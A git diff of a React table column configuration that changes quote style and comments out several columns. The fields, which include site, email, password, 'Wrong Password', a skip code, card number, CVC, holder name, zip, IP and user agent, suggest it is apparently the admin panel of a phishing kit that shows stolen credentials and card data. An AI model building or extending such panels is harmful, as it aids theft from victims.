@@ -1,65 +1,65 @@
-import Link from "next/link";
-import { getTimeDistance } from "../../../utils/getTimeDistance";
-import DeleteCollection from "../../DeleteCollection";
+import Link from 'next/link';
+import { getTimeDistance } from '../../../utils/getTimeDistance';
+import DeleteCollection from '../../DeleteCollection';
 
 export const collectionColumn = [
   {
-    Header: "website",
-    accessor: "site",
-    width: "auto",
+    Header: 'website',
+    accessor: 'site',
+    width: 'auto',
   },
   {
-    Header: "email",
-    accessor: "email",
-    width: "auto",
+    Header: 'email',
+    accessor: 'email',
+    width: 'auto',
   },
   {
-    Header: "password",
-    accessor: "password",
-    width: "auto",
+    Header: 'password',
+    accessor: 'password',
+    width: 'auto',
     // minWidth: 150,
   },
-  {
-    Header: "Wrong Password",
-    accessor: "Password",
-    width: "auto",
-    minWidth: 200,
-  },
-  {
-    Header: "Code",
-    accessor: "skipcode",
-    width: "auto",
-  },
-  {
-    Header: "Validity",
-    accessor: "validity",
-    width: "auto",
-  },
-  {
-    Header: "Address",
-    accessor:"address",
-    width: "auto",
-  },
-  {
-    Header: "Card Number",
-    accessor: "cardNumber",
-    width: "auto",
-  },
-  {
-    Header: "CVC",
-    accessor: "cvc",
-    width: "auto",
-  },
-  {
-    Header: "Card Holder Name",
-    accessor: "name",
-    width: "auto",
-  },
-  {
-    Header: "Zip Code",
-    accessor: "zipCode",
-    width: "auto",
-  },
+  // {
+  //   Header: "Wrong Password",
+  //   accessor: "Password",
+  //   width: "auto",
+  //   minWidth: 200,
+  // },
+  // {
+  //   Header: "Code",
+  //   accessor: "skipcode",
+  //   width: "auto",
+  // },
+  // {
+  //   Header: "Validity",
+  //   accessor: "validity",
+  //   width: "auto",
+  // },
+  // {
+  //   Header: "Address",
+  //   accessor:"address",
+  //   width: "auto",
+  // },
+  // {
+  //   Header: "Card Number",
+  //   accessor: "cardNumber",
+  //   width: "auto",
+  // },
+  // {
+  //   Header: "CVC",
+  //   accessor: "cvc",
+  //   width: "auto",
+  // },
+  // {
+  //   Header: "Card Holder Name",
+  //   accessor: "name",
+  //   width: "auto",
+  // },
+  // {
+  //   Header: "Zip Code",
+  //   accessor: "zipCode",
+  //   width: "auto",
+  // },
   // {
   //   Header: "Mail",
   //   accessor: "mail",
@@ -122,21 +122,21 @@ export const collectionColumn = [
   //   ),
   // },
   {
-    Header: "Ip",
-    accessor: "ip",
-    width: "auto",
+    Header: 'Ip',
+    accessor: 'ip',
+    width: 'auto',
   },
   {
-    Header: "Agent",
-    accessor: "agent",
+    Header: 'Agent',
+    accessor: 'agent',
     // width: "auto",
     minWidth: 500,
   },
   {
-    Header: "Time",
-    accessor: "createdAt",
+    Header: 'Time',
+    accessor: 'createdAt',
     disableSortBy: true,
-    width: "auto",
+    width: 'auto',
     // minWidth: 150,
     Cell: ({ row }) => (
       <div className="flex justify-center items-center">
